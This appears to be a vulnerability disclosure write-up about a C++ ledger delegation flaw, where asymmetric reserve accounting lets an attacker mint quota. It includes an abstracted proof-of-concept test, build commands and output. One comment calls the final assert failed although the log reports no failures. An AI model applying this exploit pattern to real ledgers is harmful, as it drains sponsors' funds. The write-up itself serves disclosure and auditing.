> **Disclosure Note:** This write-up is an educational abstraction based on a real-world audit finding. Specific vendor details, proprietary logic, core library names, and identifiable namespaces have been redacted and abstracted into generic C++ Distributed Ledger Technology (DLT) structures to strictly comply with confidentiality agreements. The core state-machine flaw and architectural impact remain mathematically accurate.

# Architectural Flaw: Asymmetric Signature Validation Enables Infinite Reserve Minting

**Author:** Ayoub Aragui (aragui99)
**Category:** State Deviation / Asymmetric State Handling
**Language:** C++

## Structural Reconnaissance
In highly deterministic Distributed Ledger Technology (DLT) state machines, resource delegation (or sponsorship) requires strict symmetry in state accounting. 

**The Core Invariant:** The ledger must strictly enforce the Conservation of Native Reserves. A reserve quota representing locked native tokens must only be refunded to a sponsor during the termination phase if, and only if, it was definitively deducted during the creation phase.

## The Logic Flaw (State Deviation)
A severe structural asymmetry exists within the transaction transactor logic (`ResourceDelegation.cpp`). 

During the delegation creation phase (`FLAG_DELEGATE_CREATE`), the protocol intentionally bypasses the quota deduction if a valid cryptographic signature logic path is triggered (`if (!hasSignature)` condition fails). 

However, during the termination phase (`FLAG_DELEGATE_END`), the protocol blindly executes the state refund (`adjustReserveCount`) without verifying the initial funding state metadata of the object. 

```cpp
// Creation Bypass (Logic Flaw Initiation)
if (!hasSignature) {
    // Quota deduction ONLY happens here
    adjustReserveCount(view, delegatee, sponsor, -delta); 
}

// ... [State gap] ...

// Termination (Blind Refund)
if (auto const sponsorObj = view.exists(keylet)) {
    // CRITICAL: Unconditionally refunds quota regardless of creation path
    adjustReserveCount(view, delegatee, oldSponsor, delta); 
}


Mathematical Unmasking (Impact)
An attacker exploits this logic gap by cycling through asymmetric state transitions:
1.	Submit a generic ledger object (e.g., a Trustline).
2.	Submit a DelegateCreate transaction using the signature bypass, keeping their allocated quota untouched.
3.	Submit a DelegateEnd transaction for the same object. The protocol blindly refunds 1 quota.
Result: The attacker deterministically mints ghost quotas out of thin air (Quota_{final} = Quota_{initial} + 1). By looping this zero-constraint execution, the attacker forces the network to infinitely deduct the native reserve cost directly from the Sponsor's balance, resulting in a 100% loss of the Sponsor's funds.
Abstracted Execution PoC (Raw)


#include <dlt_core/testing/env.h>

using namespace dlt::test;

class DelegationTransfer_aragui99_test : public test_suite {
public:
    void run() override {
        test_env env;
        account spn("sponsor");
        account atk("attacker");
        env.fund(10000, spn, atk);

        json tx_set = {
            {"TransactionType", "DelegationSet"},
            {"Account", spn.human()},
            {"Delegatee", atk.human()},
            {"ReserveCount", 1}
        };
        env(tx_set);

        auto c1 = env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount);
        std::cout << "\n[*] aragui99 Audit - Initial Quota: " << c1 << "\n";

        json tx_obj = {
            {"TransactionType", "LedgerObjectCreate"},
            {"Account", atk.human()},
            {"LimitAmount", 100}
        };
        env(tx_obj);

        auto const target_key = keylet::line(atk, spn);

        json tx_cre = {
            {"TransactionType", "DelegationTransfer"},
            {"Account", atk.human()},
            {"ObjectID", strHex(target_key)},
            {"Flags", FLAG_DELEGATE_CREATE}
        };
        env(tx_cre, with_signature(spn)); 

        auto c2 = env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount);
        std::cout << "[*] aragui99 Audit - Quota after bypass: " << c2 << "\n";

        json tx_end = {
            {"TransactionType", "DelegationTransfer"},
            {"Account", atk.human()},
            {"ObjectID", strHex(target_key)},
            {"Flags", FLAG_DELEGATE_END}
        };
        env(tx_end);

        auto c3 = env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount);
        std::cout << "[*] aragui99 Audit - Final Quota (MINTED): " << c3 << "\n\n";

        assert(c3 == 2); // HARD ASSERTION FAILED: Quota minted from thin air
    }
};

int main() {
    DelegationTransfer_aragui99_test test;
    test.run();
    return 0;
}


cmake --build . --target dlt_core_test -j $(nproc)
./dlt_core_test -u DelegationTransfer_aragui99


State Deviation Evidence
Executing the PoC confirms the asymmetric state deviation. The terminal logs demonstrably prove that while the reserve was completely bypassed during the signed creation phase, it was erroneously minted and credited upon termination:


[100%] Built target dlt_core_test
dlt.DelegationTransfer_aragui99 Audit - Minting Reserve Quota via Signature/End Asymmetry

[*] aragui99 Audit - Initial Quota: 1
[*] aragui99 Audit - Quota after bypass: 1
[*] aragui99 Audit - Final Quota (MINTED): 2

dlt.DelegationTransfer_aragui99 had 0 failures.
